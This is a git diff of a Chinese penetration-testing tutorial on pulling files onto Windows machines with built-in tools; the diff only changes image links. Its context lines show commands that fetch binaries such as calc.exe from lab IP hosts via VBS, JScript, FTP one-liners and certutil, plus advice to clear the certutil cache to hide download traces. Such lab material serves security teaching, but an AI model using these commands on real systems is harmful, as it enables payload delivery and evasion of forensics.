@@ -70,17 +70,17 @@ echo Set objXMLHTTP = Nothing >> down.vbs
 cscript down.vbs
 ```
 
-![](<../../.gitbook/assets/image (417).png>)
+![](<../../.gitbook/assets/image (417).webp>)
 
 ### 3、兼容性测试
 
-![Win2003 R2 SP2](<../../.gitbook/assets/image (244).png>)
+![Win2003 R2 SP2](<../../.gitbook/assets/image (244).webp>)
 
-![Win2008 R2](<../../.gitbook/assets/image (617).png>)
+![Win2008 R2](<../../.gitbook/assets/image (617).webp>)
 
-![Win10](<../../.gitbook/assets/image (318).png>)
+![Win10](<../../.gitbook/assets/image (318).webp>)
 
-![HTTPS下载测试失败](<../../.gitbook/assets/image (887).png>)
+![HTTPS下载测试失败](<../../.gitbook/assets/image (887).webp>)
 
 ## 2、JS下载
 
@@ -102,7 +102,7 @@ echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq
 cscript /nologo down.js http://172.16.175.1/robots.txt > Hello.txt
 ```
 
-![在Win2003里测试](<../../.gitbook/assets/image (242).png>)
+![在Win2003里测试](<../../.gitbook/assets/image (242).webp>)
 
 ### 2、二进制payload
 
@@ -130,13 +130,13 @@ cscript /nologo down.js http://172.16.175.1/calc.exe D:\test\calc.exe
 
 ### 3、兼容性测试
 
-![Windows2003](<../../.gitbook/assets/image (748).png>)
+![Windows2003](<../../.gitbook/assets/image (748).webp>)
 
-![Windows2008](<../../.gitbook/assets/image (132).png>)
+![Windows2008](<../../.gitbook/assets/image (132).webp>)
 
-![win10](<../../.gitbook/assets/image (331).png>)
+![win10](<../../.gitbook/assets/image (331).webp>)
 
-![HTTPS下载](<../../.gitbook/assets/image (844).png>)
+![HTTPS下载](<../../.gitbook/assets/image (844).webp>)
 
 ## 3、FTP下载
 
@@ -158,7 +158,7 @@ echo bye >> ftp.txt
 ftp -A -s:ftp.txt
 ```
 
-![](<../../.gitbook/assets/image (264).png>)
+![](<../../.gitbook/assets/image (264).webp>)
 
 ### 2、密码模式
 
@@ -179,7 +179,7 @@ echo bye >> ftp.txt
 ftp -s:ftp.txt
 ```
 
-![](<../../.gitbook/assets/image (346).png>)
+![](<../../.gitbook/assets/image (346).webp>)
 
 ### 3、一句话下载
 
@@ -200,15 +200,16 @@ echo open 172.16.175.200 21>f&echo user>>f&echo pass>>f&echo binary>>f&echo get 
 echo open 172.16.175.200>f&echo get calc.exe>>f&echo bye>>f&ftp -A -s:f&del /f /q f
 ```
 
-![匿名版](<../../.gitbook/assets/image (795).png>)
+![匿名版](<../../.gitbook/assets/image (795).webp>)
 
-![密码版](<../../.gitbook/assets/image (940).png>)
+![密码版](<../../.gitbook/assets/image (940).webp>)
 
-![最短语句版](<../../.gitbook/assets/image (407).png>)
+![最短语句版](<../../.gitbook/assets/image (407).webp>)
 
 ## 4、certutil下载
 
-该工具是证书服务的组件，用于转储和显示证书颁发机构配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。 经过测试该组件在Win2003、2008、7、10里可用，**XP下没有**
+
+该工具是证书服务的组件，用于转储和显示证书颁发机构配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。 经过测试该组件在Win2003、2008、7、10里可用，**XP下没有**
 
 **1、下载测试**
 
@@ -216,15 +217,16 @@ echo open 172.16.175.200>f&echo get calc.exe>>f&echo bye>>f&ftp -A -s:f&del /f /
 certutil.exe -urlcache -split -f http://172.16.175.1/robots.txt
 ```
 
-![](<../../.gitbook/assets/image (124).png>)
+![](<../../.gitbook/assets/image (124).webp>)
 
-使用certutil下载文件之后一定要**记得清理缓存**
+
+使用certutil下载文件之后一定要**记得清理缓存**
 
 ```
 certutil.exe -urlcache -split -f http://172.16.175.1/robots.txt delete
 ```
 
-![](<../../.gitbook/assets/image (1032).png>)
+![](<../../.gitbook/assets/image (1032).webp>)
 
 如果没有清理缓存，你的下载记录都会在这里
 
@@ -234,13 +236,13 @@ certutil.exe -urlcache -split -f http://172.16.175.1/robots.txt delete
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
 ```
 
-![](<../../.gitbook/assets/image (870).png>)
+![](<../../.gitbook/assets/image (870).webp>)
 
 **2、Windows defender**
 
 经过测试 Windows Defender现在会拦截 certutil下载文件
 
-![](<../../.gitbook/assets/image (1009).png>)
+![](<../../.gitbook/assets/image (1009).webp>)
 
 **3、其他常用功能**
 
@@ -251,7 +253,7 @@ certutil.exe -urlcache -split -f http://172.16.175.1/robots.txt delete
 certutil -hashfile calc.exe md5
 ```
 
-![](<../../.gitbook/assets/image (288).png>)
+![](<../../.gitbook/assets/image (288).webp>)
 
 ```
 ## base64编码文件
@@ -259,15 +261,15 @@ certutil -hashfile calc.exe md5
 -encode 编码文件
 ```
 
-![](<../../.gitbook/assets/image (20).png>)
+![](<../../.gitbook/assets/image (20).webp>)
 
-![](<../../.gitbook/assets/image (354).png>)
+![](<../../.gitbook/assets/image (354).webp>)
 
 ```
 -decode 解码文件
 ```
 
-![](<../../.gitbook/assets/image (360).png>)
+![](<../../.gitbook/assets/image (360).webp>)
 
 ```
 ## Hex编码文件
@@ -275,7 +277,7 @@ certutil -hashfile calc.exe md5
 -encodehex 把文件编码为hex    #可以用来应急查看文件16进制，还有一个对应的-decodehex
 ```
 
-![](<../../.gitbook/assets/image (313).png>)
+![](<../../.gitbook/assets/image (313).webp>)
 
 ## 5、BITSAdmin下载
 
@@ -301,7 +303,7 @@ bitsadmin /transfer down /priority normal "http://172.16.175.1/robots.txt" C:\Us
 bitsadmin /transfer down /priority normal "https://github.com/ChrisKempson/Tomorrow-Theme/raw/master/Images/Tomorrow-Night-Blue-Palette.png" C:\Users\xxx\Downloads\a.png
 ```
 
-![](<../../.gitbook/assets/image (250).png>)
+![](<../../.gitbook/assets/image (250).webp>)
 
 ## 6、powershell下载
 
@@ -313,7 +315,7 @@ bitsadmin /transfer down /priority normal "https://github.com/ChrisKempson/Tomor
 powershell $PSVersionTable
 ```
 
-![](<../../.gitbook/assets/image (335).png>)
+![](<../../.gitbook/assets/image (335).webp>)
 
 ### 2、基于Sytem.Net.WebClient
 
